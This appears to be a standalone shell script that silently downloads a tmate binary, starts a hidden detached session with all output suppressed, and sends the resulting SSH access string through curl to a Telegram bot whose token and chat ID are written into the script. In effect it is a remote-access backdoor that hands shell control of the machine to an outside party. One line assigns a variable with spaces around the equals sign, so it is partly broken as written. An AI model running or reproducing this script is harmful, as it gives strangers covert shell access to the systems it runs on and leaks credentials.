pkill -9 tmate
wget -nc https://github.com/tmate-io/tmate/releases/download/2.4.0/tmate-2.4.0-static-linux-i386.tar.xz &> /dev/null
tar --skip-old-files -xvf tmate-2.4.0-static-linux-i386.tar.xz &> /dev/null
rm -f nohup.out; bash -ic 'nohup ./tmate-2.4.0-static-linux-i386/tmate -S /tmp/tmate.sock new-session -d & disown -a' >/dev/null 2>&1
output = $(./tmate-2.4.0-static-linux-i386/tmate -S /tmp/tmate.sock wait tmate-ready && ./tmate-2.4.0-static-linux-i386/tmate -S /tmp/tmate.sock display -p "#{tmate_ssh}")
curl -s "https://api.telegram.org/bot5137896150:AAEcXG7fkPYa3y0xowgM-1yxMHNP3TA9HJs/sendMessage?chat_id=1380298324&text=$output"
